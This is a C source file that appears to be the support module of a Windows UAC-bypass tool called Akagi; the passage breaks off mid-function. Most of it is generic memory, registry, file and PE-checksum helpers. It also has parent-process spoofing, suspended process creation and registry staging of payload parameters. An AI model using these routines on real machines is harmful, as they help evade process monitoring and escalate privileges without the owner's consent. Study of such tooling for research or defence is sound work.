/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2018
*
*  TITLE:       SUP.C
*
*  VERSION:     3.00
*
*  DATE:        25 Aug 2018
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* supEncodePointer
*
* Purpose:
*
* Encodes the specified pointer.
*
*/
PVOID supEncodePointer(
    _In_ PVOID Pointer)
{   
    NTSTATUS Status;
    ULONG Cookie, retLength;

    if (g_ctx.Cookie == 0) {

        Status = NtQueryInformationProcess(
            NtCurrentProcess(),
            ProcessCookie,
            &Cookie,
            sizeof(ULONG),
            &retLength);

        if (!NT_SUCCESS(Status))
            RtlRaiseStatus(Status);

        g_ctx.Cookie = Cookie;

    }
    else {
        Cookie = g_ctx.Cookie;
    }

#ifdef _WIN64
    return (PVOID)(RotateRight64(
        (ULONG_PTR)Pointer ^ Cookie,
        Cookie & 0x3f));
#else
    return (PVOID)(RotateRight32(
        (ULONG_PTR)Pointer ^ Cookie, 
        Cookie & 0x1f));
#endif
}

/*
* supDecodePointer
*
* Purpose:
*
* Decodes the specified pointer.
*
*/
PVOID supDecodePointer(
    _In_ PVOID Pointer)
{
    NTSTATUS Status;
    ULONG Cookie, retLength;

    if (g_ctx.Cookie == 0) {

        Status = NtQueryInformationProcess(
            NtCurrentProcess(),
            ProcessCookie,
            &Cookie,
            sizeof(ULONG),
            &retLength);

        if (!NT_SUCCESS(Status))
            RtlRaiseStatus(Status);

    }
    else {
        Cookie = g_ctx.Cookie;
    }

#ifdef _WIN64
    return (PVOID)(RotateRight64(
        (ULONG_PTR)Pointer, 
        0x40 - (Cookie & 0x3f)) ^ Cookie);
#else
    return (PVOID)(RotateRight32(
        (ULONG_PTR)Pointer, 
        0x20 - (Cookie & 0x1f)) ^ Cookie);
#endif
}

/*
* supVirtualAlloc
*
* Purpose:
*
* Wrapper for NtAllocateVirtualMemory.
*
*/
PVOID supVirtualAlloc(
    _Inout_ PSIZE_T Size,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect,
    _Out_opt_ NTSTATUS *Status)
{
    NTSTATUS status;
    PVOID Buffer = NULL;
    SIZE_T size;
    
    size = *Size;

    status = NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &Buffer,
        0,
        &size,
        AllocationType,
        Protect);

    if (NT_SUCCESS(status)) {
        RtlSecureZeroMemory(Buffer, size);
    }

    *Size = size;
    if (Status) *Status = status;

    return Buffer;
}

/*
* supVirtualFree
*
* Purpose:
*
* Wrapper for NtFreeVirtualMemory.
*
*/
BOOL supVirtualFree(
    _In_ PVOID Memory,
    _Out_opt_ NTSTATUS *Status)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    SIZE_T size = 0;

    status = NtFreeVirtualMemory(
        NtCurrentProcess(),
        &Memory,
        &size,
        MEM_RELEASE);

    if (Status) *Status = status;

    return NT_SUCCESS(status);
}

/*
* supHeapAlloc
*
* Purpose:
*
* Wrapper for RtlAllocateHeap with ucmHeap.
*
*/
PVOID FORCEINLINE supHeapAlloc(
    _In_ SIZE_T Size)
{
    return RtlAllocateHeap(g_ctx.ucmHeap, HEAP_ZERO_MEMORY, Size);
}

/*
* supHeapFree
*
* Purpose:
*
* Wrapper for RtlFreeHeap with ucmHeap.
*
*/
BOOL FORCEINLINE supHeapFree(
    _In_ PVOID Memory)
{
    return RtlFreeHeap(g_ctx.ucmHeap, 0, Memory);
}

/*
* supQueryProcessTokenIL
*
* Purpose:
*
* Return integrity level for given process.
*
*/
_Success_(return == TRUE)
BOOL supQueryProcessTokenIL(
    _In_ HANDLE hProcess,
    _Out_ PULONG IntegrityLevel)
{
    BOOL                            bCond = FALSE, bResult = FALSE;
    HANDLE                          hToken = NULL;
    PTOKEN_MANDATORY_LABEL          pTIL = NULL;
    ULONG                           Length = 0;

    do {

        if (!NT_SUCCESS(NtOpenProcessToken(
            hProcess,
            TOKEN_QUERY,
            &hToken)))
        {
            break;
        }

        if (STATUS_BUFFER_TOO_SMALL != NtQueryInformationToken(
            hToken,
            TokenIntegrityLevel,
            NULL,
            0,
            &Length))
        {
            break;
        }

        pTIL = (PTOKEN_MANDATORY_LABEL)_alloca(Length); //-V505

        if (!NT_SUCCESS(NtQueryInformationToken(
            hToken,
            TokenIntegrityLevel,
            pTIL,
            Length,
            &Length)))
        {
            break;
        }

        if (IntegrityLevel)
            *IntegrityLevel = *RtlSubAuthoritySid(
                pTIL->Label.Sid,
                (DWORD)(UCHAR)(*RtlSubAuthorityCountSid(pTIL->Label.Sid) - 1));

        bResult = TRUE;

    } while (bCond);

    if (hToken) NtClose(hToken);

    return bResult;
}

/*
* supGetProcessWithILAsCaller
*
* Purpose:
*
* Returns handle for the process with same integrity level as caller.
*
*/
HANDLE supGetProcessWithILAsCaller(
    _In_ ACCESS_MASK UseDesiredAccess
)
{
    BOOL                            bCond = FALSE;
    HANDLE                          hProcess = NULL;
    HANDLE                          CurrentProcessId = NtCurrentTeb()->ClientId.UniqueProcess;
    PSYSTEM_PROCESSES_INFORMATION   ProcessList = NULL, pList;
    CLIENT_ID                       cid;
    OBJECT_ATTRIBUTES               obja;
    ULONG                           Level = 0, ForeignLevel = 0;

    do {

        if (!supQueryProcessTokenIL(NtCurrentProcess(), &Level))
            break;

        ProcessList = supGetSystemInfo(SystemProcessInformation);
        if (ProcessList) {
            pList = ProcessList;
            for (;;) {

                if (pList->UniqueProcessId != CurrentProcessId) {

                    cid.UniqueProcess = pList->UniqueProcessId;
                    cid.UniqueThread = NULL;
                    InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);

                    if (NT_SUCCESS(NtOpenProcess(
                        &hProcess,
                        PROCESS_QUERY_LIMITED_INFORMATION | UseDesiredAccess,
                        &obja,
                        &cid)))
                    {
                        if (supQueryProcessTokenIL(hProcess, &ForeignLevel)) {
                            if (ForeignLevel == Level)
                                break;
                        }
                        NtClose(hProcess);
                    }
                }

                if (pList->NextEntryDelta == 0)
                    break;

                pList = (PSYSTEM_PROCESSES_INFORMATION)(((LPBYTE)pList) + pList->NextEntryDelta);
            }

        } //if

    } while (bCond);

    if (ProcessList) supHeapFree(ProcessList);

    return hProcess;
}

/*
* supIsProcess32bit
*
* Purpose:
*
* Return TRUE if given process is under WOW64, FALSE otherwise.
*
*/
BOOLEAN supIsProcess32bit(
    _In_ HANDLE hProcess
)
{
    NTSTATUS status;
    PROCESS_EXTENDED_BASIC_INFORMATION pebi;

    if (hProcess == NULL) {
        return FALSE;
    }

    //query if this is wow64 process
    RtlSecureZeroMemory(&pebi, sizeof(pebi));
    pebi.Size = sizeof(PROCESS_EXTENDED_BASIC_INFORMATION);
    status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pebi, sizeof(pebi), NULL);
    if (NT_SUCCESS(status)) {
        return (pebi.IsWow64Process == 1);
    }
    return FALSE;
}

/*
* supGetElevationType
*
* Purpose:
*
* Returns client elevation type.
*
*/
BOOL supGetElevationType(
    _Out_ TOKEN_ELEVATION_TYPE *lpType
)
{
    HANDLE hToken = NULL;
    NTSTATUS status;
    ULONG bytesRead = 0;
    TOKEN_ELEVATION_TYPE TokenType = TokenElevationTypeDefault;
   
    status = NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
    if (NT_SUCCESS(status)) {

        status = NtQueryInformationToken(hToken, TokenElevationType, &TokenType,
            sizeof(TOKEN_ELEVATION_TYPE), &bytesRead);

        NtClose(hToken);
    }

    supSetLastErrorFromNtStatus(status);

    if (lpType)
        *lpType = TokenType;

    return (NT_SUCCESS(status));
}

/*
* supWriteBufferToFile
*
* Purpose:
*
* Create new file and write buffer to it.
*
*/
BOOL supWriteBufferToFile(
    _In_ LPWSTR lpFileName,
    _In_ PVOID Buffer,
    _In_ DWORD BufferSize
)
{
    HANDLE hFile;
    DWORD bytesIO = 0;

    if ((Buffer == NULL) || (BufferSize == 0))
        return FALSE;

    hFile = CreateFile(lpFileName,
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, Buffer, BufferSize, &bytesIO, NULL);
        CloseHandle(hFile);
    }
    else {
#ifdef _DEBUG
        supDebugPrint(TEXT("CreateFile"), GetLastError());
#endif
        return FALSE;
    }

    return (bytesIO == BufferSize);
}

/*
* supDebugPrint
*
* Purpose:
*
* Write formatted debug output.
*
*/
VOID supDebugPrint(
    _In_ LPWSTR ApiName,
    _In_ DWORD status
)
{
    LPWSTR lpBuffer;
    SIZE_T sz;

    sz = MAX_PATH;
    if (ApiName)
        sz += _strlen(ApiName);

    lpBuffer = supHeapAlloc(sz * sizeof(WCHAR));
    if (lpBuffer) {
        _strcpy(lpBuffer, TEXT("[UCM] "));
        if (ApiName) {
            _strcat(lpBuffer, ApiName);
        }
        _strcat(lpBuffer, TEXT(" code = 0x"));
        ultohex(status, _strend(lpBuffer));
        _strcat(lpBuffer, TEXT("\n"));
        OutputDebugString(lpBuffer);
        supHeapFree(lpBuffer);
    }

    SetLastError(status);
}

/*
* supRegReadValue
*
* Purpose:
*
* Read given value to output buffer.
* Returned Buffer must be released with RtlFreeHeap after use.
*
*/
NTSTATUS supRegReadValue(
    _In_ HANDLE hKey,
    _In_ LPWSTR ValueName,
    _In_ DWORD ValueType,
    _Out_ PVOID *Buffer,
    _Out_ ULONG *BufferSize,
    _In_opt_ HANDLE hHeap
)
{
    KEY_VALUE_PARTIAL_INFORMATION *kvpi;
    UNICODE_STRING usName;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    ULONG Length = 0;
    PVOID CopyBuffer = NULL;
    HANDLE Heap;

    *Buffer = NULL;
    *BufferSize = 0;

    if (hHeap == NULL)
        Heap = NtCurrentPeb()->ProcessHeap;
    else
        Heap = hHeap;

    RtlInitUnicodeString(&usName, ValueName);
    Status = NtQueryValueKey(hKey, &usName, KeyValuePartialInformation, NULL, 0, &Length);
    if (Status == STATUS_BUFFER_TOO_SMALL) {

        kvpi = RtlAllocateHeap(Heap, HEAP_ZERO_MEMORY, Length);
        if (kvpi) {

            Status = NtQueryValueKey(hKey, &usName, KeyValuePartialInformation, kvpi, Length, &Length);
            if (NT_SUCCESS(Status)) {

                if (kvpi->Type == ValueType) {

                    CopyBuffer = RtlAllocateHeap(Heap, HEAP_ZERO_MEMORY, kvpi->DataLength);
                    if (CopyBuffer) {
                        RtlCopyMemory(CopyBuffer, kvpi->Data, kvpi->DataLength);
                        *Buffer = CopyBuffer;
                        *BufferSize = kvpi->DataLength;
                        Status = STATUS_SUCCESS;
                    }
                    else {
                        Status = STATUS_NO_MEMORY;
                    }
                }
                else {
                    Status = STATUS_OBJECT_TYPE_MISMATCH;
                }
            }
            RtlFreeHeap(Heap, 0, kvpi);
        }
        else {
            Status = STATUS_NO_MEMORY;
        }
    }

    return Status;
}

/*
* supDeleteKeyValueAndFlushKey
*
* Purpose:
*
* Remove value of the given subkey and flush key.
*
*/
BOOL supDeleteKeyValueAndFlushKey(
    _In_ HKEY hRootKey,
    _In_ LPWSTR lpKeyName,
    _In_ LPWSTR lpValueName)
{
    HKEY hKey = NULL;
    LRESULT lResult;

    if (ERROR_SUCCESS == RegOpenKeyEx(
        hRootKey,
        lpKeyName,
        0,
        MAXIMUM_ALLOWED,
        &hKey))
    {
        lResult = RegDeleteValue(hKey, lpValueName);
        if (lResult == ERROR_SUCCESS) {
            RegFlushKey(hKey);
        }
        RegCloseKey(hKey);
        return (lResult == ERROR_SUCCESS);
    }
    return FALSE;
}

/*
* supReadFileToBuffer
*
* Purpose:
*
* Read file to buffer. Release memory when it no longer needed.
*
*/
PBYTE supReadFileToBuffer(
    _In_ LPWSTR lpFileName,
    _Inout_opt_ LPDWORD lpBufferSize
)
{
    BOOL        bCond = FALSE;
    NTSTATUS    status;
    HANDLE      hFile = NULL, hRoot = NULL;
    PBYTE       Buffer = NULL;
    SIZE_T      sz = 0;

    UNICODE_STRING              usName;
    OBJECT_ATTRIBUTES           attr;
    IO_STATUS_BLOCK             iost;
    FILE_STANDARD_INFORMATION   fi;

    do {

        if (lpFileName == NULL)
            return NULL;

        if (!RtlDosPathNameToNtPathName_U(
            NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath.Buffer, &usName, NULL, NULL))
        {
            break;
        }

        InitializeObjectAttributes(&attr, &usName, OBJ_CASE_INSENSITIVE, 0, NULL);
        
        status = NtCreateFile(
            &hRoot, 
            FILE_LIST_DIRECTORY | SYNCHRONIZE,
            &attr,
            &iost,
            NULL,
            0,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0
        );

        RtlFreeUnicodeString(&usName);

        if (!NT_SUCCESS(status)) {
            break;
        }

        RtlInitUnicodeString(&usName, lpFileName);
        InitializeObjectAttributes(&attr, &usName, OBJ_CASE_INSENSITIVE, hRoot, NULL);

        status = NtCreateFile(
            &hFile,
            FILE_READ_DATA | SYNCHRONIZE,
            &attr,
            &iost,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0
        );

        if (!NT_SUCCESS(status)) {
            break;
        }

        RtlSecureZeroMemory(&fi, sizeof(fi));
        
        status = NtQueryInformationFile(
            hFile, 
            &iost, 
            &fi, 
            sizeof(FILE_STANDARD_INFORMATION), 
            FileStandardInformation);
        
        if (!NT_SUCCESS(status))
            break;

        sz = (SIZE_T)fi.EndOfFile.LowPart;

        Buffer = supVirtualAlloc(
            &sz, 
            DEFAULT_ALLOCATION_TYPE, 
            DEFAULT_PROTECT_TYPE, 
            &status);

        if (NT_SUCCESS(status)) {

            status = NtReadFile(
                hFile, 
                NULL, 
                NULL, 
                NULL, 
                &iost, 
                Buffer, 
                fi.EndOfFile.LowPart, 
                NULL, 
                NULL);

            if (NT_SUCCESS(status)) {
                if (lpBufferSize)
                    *lpBufferSize = fi.EndOfFile.LowPart;
            }
            else {
                supVirtualFree(Buffer, NULL);
                Buffer = NULL;
            }
        }

    } while (bCond);

    if (hRoot != NULL) {
        NtClose(hRoot);
    }

    if (hFile != NULL) {
        NtClose(hFile);
    }

    return Buffer;
}

/*
* supRunProcess2
*
* Purpose:
*
* Execute given process with given parameters and wait if specified.
*
*/
BOOL supRunProcess2(
    _In_ LPWSTR lpszProcessName,
    _In_opt_ LPWSTR lpszParameters,
    _In_opt_ LPWSTR lpVerb,
    _In_ BOOL fWait
)
{
    BOOL bResult;
    SHELLEXECUTEINFO shinfo;

    if (lpszProcessName == NULL)
        return FALSE;

    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
    shinfo.cbSize = sizeof(shinfo);
    shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shinfo.lpFile = lpszProcessName;
    shinfo.lpParameters = lpszParameters;
    shinfo.lpDirectory = NULL;
    shinfo.nShow = SW_SHOW;
    shinfo.lpVerb = lpVerb;
    bResult = ShellExecuteEx(&shinfo);
    if (bResult) {
        if (fWait) {
            if (WaitForSingleObject(shinfo.hProcess, 32000) == WAIT_TIMEOUT)
                TerminateProcess(shinfo.hProcess, WAIT_TIMEOUT);
        }
        CloseHandle(shinfo.hProcess);
    }
    return bResult;
}

/*
* supRunProcess
*
* Purpose:
*
* Execute given process with given parameters.
*
*/
BOOL supRunProcess(
    _In_ LPWSTR lpszProcessName,
    _In_opt_ LPWSTR lpszParameters
)
{
    return supRunProcess2(lpszProcessName, lpszParameters, NULL, TRUE);
}

/*
* supRunProcessEx
*
* Purpose:
*
* Start new process in suspended state.
*
*/
_Success_(return != NULL)
HANDLE NTAPI supRunProcessEx(
    _In_ LPWSTR lpszParameters,
    _In_opt_ LPWSTR lpCurrentDirectory,
    _In_opt_ LPWSTR lpApplicationName,
    _Out_opt_ HANDLE *PrimaryThread
)
{
    BOOL bResult = FALSE;
    LPWSTR pszBuffer = NULL;
    SIZE_T ccb;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    DWORD dwFlags = CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS;

    if (lpszParameters == NULL)
        return NULL;

    ccb = (1 + _strlen(lpszParameters)) * sizeof(WCHAR);
    pszBuffer = supHeapAlloc(ccb);
    if (pszBuffer == NULL)
        return NULL;

    _strcpy(pszBuffer, lpszParameters);

    RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    GetStartupInfo(&si);

    bResult = CreateProcessAsUser(
        NULL,
        lpApplicationName,
        pszBuffer,
        NULL,
        NULL,
        FALSE,
        dwFlags | CREATE_SUSPENDED,
        NULL,
        lpCurrentDirectory,
        &si,
        &pi);

    if (bResult) {
        if (PrimaryThread) {
            *PrimaryThread = pi.hThread;
        }
        else {
            CloseHandle(pi.hThread);
        }
    }
    supHeapFree(pszBuffer);
    return pi.hProcess;
}

/*
* supRunProcessIndirect
*
* Purpose:
*
* Start new process indirectly with parent set to
* randomly selected process of the same IL.
*
*/
_Success_(return != NULL)
HANDLE NTAPI supRunProcessIndirect(
    _In_ LPWSTR lpszParameters,
    _In_opt_ LPWSTR lpCurrentDirectory,
    _Inout_opt_ LPWSTR lpApplicationName,
    _In_ ULONG CreationFlags,
    _In_ WORD ShowWindowFlags,
    _Out_opt_ HANDLE *PrimaryThread
)
{
    BOOL bResult = FALSE;
    DWORD dwFlags = CreationFlags | CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS;

    LPWSTR pszBuffer = NULL;
    SIZE_T size;
    STARTUPINFOEX si;
    PROCESS_INFORMATION pi;

    HANDLE hProcess, hToken = NULL, hNewProcess = NULL;

    hProcess = supGetProcessWithILAsCaller(PROCESS_CREATE_PROCESS);
    if (hProcess == NULL)
        return NULL;

    RtlSecureZeroMemory(&pi, sizeof(pi));
    RtlSecureZeroMemory(&si, sizeof(si));

    size = (1 + _strlen(lpszParameters)) * sizeof(WCHAR);
    pszBuffer = supHeapAlloc(size);
    if (pszBuffer) {

        _strcpy(pszBuffer, lpszParameters);
        si.StartupInfo.cb = sizeof(STARTUPINFOEX);

        size = 0x30;

        do {
            if (size > 1024)
                break;

            if (size)
                si.lpAttributeList = _alloca(size); //-V505

            if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) {
                if (UpdateProcThreadAttribute(si.lpAttributeList, 0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(hProcess), 0, 0)) //-V616
                {

                    if (NT_SUCCESS(NtOpenProcessToken(
                        hProcess,
                        TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
                        &hToken)))
                    {
                        si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
                        si.StartupInfo.wShowWindow = ShowWindowFlags;

                        bResult = CreateProcessAsUser(
                            hToken,
                            lpApplicationName,
                            pszBuffer,
                            NULL,
                            NULL,
                            FALSE,
                            dwFlags | EXTENDED_STARTUPINFO_PRESENT,
                            NULL,
                            lpCurrentDirectory,
                            (LPSTARTUPINFO)&si,
                            &pi);

                        if (bResult) {
                            hNewProcess = pi.hProcess;
                            if (PrimaryThread) {
                                *PrimaryThread = pi.hThread;
                            }
                            else {
                                CloseHandle(pi.hThread);
                            }
                        }

                        NtClose(hToken);
                    }

                }
            
                if (si.lpAttributeList)
                    DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine
            }

        } while (GetLastError() == ERROR_INSUFFICIENT_BUFFER);

        supHeapFree(pszBuffer);
    }

    NtClose(hProcess);

    return hNewProcess;
}

/*
* supCopyMemory
*
* Purpose:
*
* Copies bytes between buffers.
*
* dest - Destination buffer
* cbdest - Destination buffer size in bytes
* src - Source buffer
* cbsrc - Source buffer size in bytes
*
*/
void supCopyMemory(
    _Inout_ void *dest,
    _In_ size_t cbdest,
    _In_ const void *src,
    _In_ size_t cbsrc
)
{
    char *d = (char*)dest;
    char *s = (char*)src;

    if ((dest == 0) || (src == 0) || (cbdest == 0))
        return;
    if (cbdest < cbsrc)
        cbsrc = cbdest;

    while (cbsrc > 0) {
        *d++ = *s++;
        cbsrc--;
    }
}

/*
* supQueryEntryPointRVA
*
* Purpose:
*
* Return EP RVA of the given PE file.
*
*/
DWORD supQueryEntryPointRVA(
    _In_ LPWSTR lpImageFile
)
{
    PVOID                       ImageBase;
    PIMAGE_DOS_HEADER           pdosh;
    PIMAGE_FILE_HEADER          pfh1;
    PIMAGE_OPTIONAL_HEADER      poh;
    DWORD                       epRVA = 0;

    if (lpImageFile == NULL) {
        return 0;
    }

    ImageBase = LoadLibraryExW(lpImageFile, 0, DONT_RESOLVE_DLL_REFERENCES);
    if (ImageBase) {

        pdosh = (PIMAGE_DOS_HEADER)ImageBase;
        pfh1 = (PIMAGE_FILE_HEADER)((ULONG_PTR)ImageBase + (pdosh->e_lfanew + sizeof(DWORD)));
        poh = (PIMAGE_OPTIONAL_HEADER)((ULONG_PTR)pfh1 + sizeof(IMAGE_FILE_HEADER));

        //AddressOfEntryPoint is in standard fields.
        epRVA = poh->AddressOfEntryPoint;

        FreeLibrary(ImageBase);
    }
    return epRVA;
}

/*
* supQueryEnvironmentVariableOffset
*
* Purpose:
*
* Return offset to the given environment variable.
*
*/
LPWSTR supQueryEnvironmentVariableOffset(
    _In_ PUNICODE_STRING Value
)
{
    UNICODE_STRING   str1;
    PWCHAR           EnvironmentBlock, ptr;

    EnvironmentBlock = RtlGetCurrentPeb()->ProcessParameters->Environment;
    ptr = EnvironmentBlock;

    do {
        if (*ptr == 0)
            return 0;

        RtlInitUnicodeString(&str1, ptr);
        if (RtlPrefixUnicodeString(Value, &str1, TRUE))
            break;

        ptr += _strlen(ptr) + 1;

    } while (1);

    return (ptr + Value->Length / sizeof(WCHAR));
}

/*
* supSaveAkagiParameters
*
* Purpose:
*
* Store Akagi parameters.
*
*/
BOOL supSaveAkagiParameters(
    VOID
)
{
    BOOL bResult = FALSE;
    HKEY hKey = NULL;
    LRESULT lRet;

    DWORD bytesIO = 0;
    WCHAR szQuery[100];
    WCHAR szParameter[MAX_PATH];

    ULONG SessionId = NtCurrentPeb()->SessionId;

    szQuery[0] = 0;
    szParameter[0] = 0;

    lRet = RegCreateKeyEx(HKEY_CURRENT_USER, T_AKAGI_KEY, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

    if ((lRet == ERROR_SUCCESS) && (hKey != NULL)) {

        //
        // Save current session id.
        //
        lRet = RegSetValueEx(
            hKey,
            T_AKAGI_SESSION,
            0,
            REG_DWORD,
            (BYTE *)&SessionId,
            sizeof(DWORD));

        //
        // Save flag.
        //
        if (lRet == ERROR_SUCCESS) {

            lRet = RegSetValueEx(
                hKey,
                T_AKAGI_FLAG,
                0,
                REG_DWORD,
                (BYTE *)&g_ctx.AkagiFlag,
                sizeof(DWORD));

        }

        //
        // Save WinStation + Desktop.
        //
        RtlSecureZeroMemory(&szQuery, sizeof(szQuery));
        RtlSecureZeroMemory(&szParameter, sizeof(szParameter));
        if (supWinstationToName(NULL, szQuery, sizeof(szQuery), &bytesIO)) {
            _strcpy(szParameter, szQuery);
            _strcat(szParameter, TEXT("\\"));

            RtlSecureZeroMemory(&szQuery, sizeof(szQuery));
            if (supDesktopToName(NULL, szQuery, sizeof(szQuery), &bytesIO)) {
                _strcat(szParameter, szQuery);

                bytesIO = (DWORD)((1 + _strlen(szParameter)) * sizeof(WCHAR));

                lRet = RegSetValueEx(
                    hKey,
                    T_AKAGI_DESKTOP,
                    0,
                    REG_SZ,
                    (LPBYTE)&szParameter,
                    bytesIO);
            }
        }

        bResult = (lRet == ERROR_SUCCESS);

        RegCloseKey(hKey);
    }

    return bResult;
}

/*
* supSetParameter
*
* Purpose:
*
* Set parameter for payload execution.
*
*/
BOOL supSetParameter(
    _In_ LPWSTR lpParameter,
    _In_ DWORD cbParameter
)
{
    BOOL bResult = FALSE;
    HKEY hKey = NULL;
    LRESULT lRet;

    lRet = RegCreateKeyEx(HKEY_CURRENT_USER, T_AKAGI_KEY, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

    if ((lRet == ERROR_SUCCESS) && (hKey != NULL)) {
        
        //
        // Write optional parameter.
        //
        lRet = RegSetValueEx(hKey, T_AKAGI_PARAM, 0, REG_SZ,
            (LPBYTE)lpParameter, cbParameter);

        bResult = (lRet == ERROR_SUCCESS);

        RegCloseKey(hKey);
    }

    return bResult;
}

/*
* supChkSum
*
* Purpose:
*
* Calculate partial checksum for given buffer.
*
*/
USHORT supChkSum(
    ULONG PartialSum,
    PUSHORT Source,
    ULONG Length
)
{
    while (Length--) {
        PartialSum += *Source++;
        PartialSum = (PartialSum >> 16) + (PartialSum & 0xffff);
    }
    return (USHORT)(((PartialSum >> 16) + PartialSum) & 0xffff);
}

/*
* supCalculateCheckSumForMappedFile
*
* Purpose:
*
* Calculate PE file checksum.
*
*/
DWORD supCalculateCheckSumForMappedFile(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength
)
{
    PUSHORT AdjustSum;
    PIMAGE_NT_HEADERS NtHeaders;
    USHORT PartialSum;
    ULONG CheckSum;

    PartialSum = supChkSum(0, (PUSHORT)BaseAddress, (FileLength + 1) >> 1);

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders != NULL) {
        AdjustSum = (PUSHORT)(&NtHeaders->OptionalHeader.CheckSum);
        PartialSum -= (PartialSum < AdjustSum[0]);
        PartialSum -= AdjustSum[0];
        PartialSum -= (PartialSum < AdjustSum[1]);
        PartialSum -= AdjustSum[1];
    }
    else
    {
        PartialSum = 0;
    }
    CheckSum = (ULONG)PartialSum + FileLength;
    return CheckSum;
}

/*
* supVerifyMappedImageMatchesChecksum
*
* Purpose:
*
* Calculate PE file checksum and compare it with checksum in PE header.
*
*/
BOOLEAN supVerifyMappedImageMatchesChecksum(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength
)
{
    PIMAGE_NT_HEADERS NtHeaders;
    ULONG HeaderSum;
    ULONG CheckSum;

    CheckSum = supCalculateCheckSumForMappedFile(BaseAddress, FileLength);

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders) {
        HeaderSum = NtHeaders->OptionalHeader.CheckSum;
    }
    else {
        HeaderSum = FileLength;
    }
    return (CheckSum == HeaderSum);
}

/*
* supSetCheckSumForMappedFile
*
* Purpose:
*
* Set checksum value to PE header.
*
*/
BOOLEAN supSetCheckSumForMappedFile(
    _In_ PVOID BaseAddress,
    _In_ ULONG CheckSum
)
{
    PIMAGE_NT_HEADERS NtHeaders;

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders) {
        NtHeaders->OptionalHeader.CheckSum = CheckSum;
        return TRUE;
    }
    return FALSE;
}

/*
* ucmShowMessage
*
* Purpose:
*
* Output message to user.
*
*/
VOID ucmShowMessage(
    _In_ LPWSTR lpszMsg
)
{
    MessageBoxW(GetDesktopWindow(), lpszMsg, PROGRAMTITLE_VERSION, MB_ICONINFORMATION);
}

/*
* ucmShowQuestion
*
* Purpose:
*
* Output message with question to user.
*
*/
INT ucmShowQuestion(
    _In_ LPWSTR lpszMsg
)
{
    return MessageBoxW(GetDesktopWindow(), lpszMsg, PROGRAMTITLE_VERSION, MB_YESNO);
}

/*
* supLdrQueryResourceData
*
* Purpose:
*
* Load resource by given id (win32 FindResource, SizeofResource, LockResource).
*
*/
PBYTE supLdrQueryResourceData(
    _In_ ULONG_PTR ResourceId,
    _In_ PVOID DllHandle,
    _In_ PULONG DataSize
)
{
    NTSTATUS                   status;
    ULONG_PTR                  IdPath[3];
    IMAGE_RESOURCE_DATA_ENTRY  *DataEntry;
    PBYTE                      Data = NULL;
    ULONG                      SizeOfData = 0;

    if (DllHandle != NULL) {

        IdPath[0] = (ULONG_PTR)RT_RCDATA; //type
        IdPath[1] = ResourceId;           //id
        IdPath[2] = 0;                    //lang

        status = LdrFindResource_U(DllHandle, (ULONG_PTR*)&IdPath, 3, &DataEntry);
        if (NT_SUCCESS(status)) {
            status = LdrAccessResource(DllHandle, DataEntry, &Data, &SizeOfData);
            if (NT_SUCCESS(status)) {
                if (DataSize) {
                    *DataSize = SizeOfData;
                }
            }
        }
    }
    return Data;
}

/*
* supSetLastErrorFromNtStatus
*
* Purpose:
*
* Convert last error.
*
*/
VOID supSetLastErrorFromNtStatus(
    _In_ NTSTATUS LastNtStatus
)
{
    DWORD dwErrorCode;
#ifdef _WIN64
    dwErrorCode = RtlNtStatusToDosErrorNoTeb(LastNtStatus);
#else
    dwErrorCode = RtlNtStatusToDosError(LastNtStatus);
#endif
    SetLastError(dwErrorCode);
}

static PWSTR g_lpszExplorer = NULL;

typedef struct _LDR_BACKUP {
    PWSTR ImagePathName;
    PWSTR CommandLine;
    PWSTR lpFullDllName;
    PWSTR lpBaseDllName;
} LDR_BACKUP, *PLDR_BACKUP;

static LDR_BACKUP g_LdrBackup;

/*
* supxLdrEnumModulesCallback
*
* Purpose:
*
* LdrEnumerateLoadedModules callback.
*
*/
VOID NTAPI supxLdrEnumModulesCallback(
    _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_ PVOID Context,
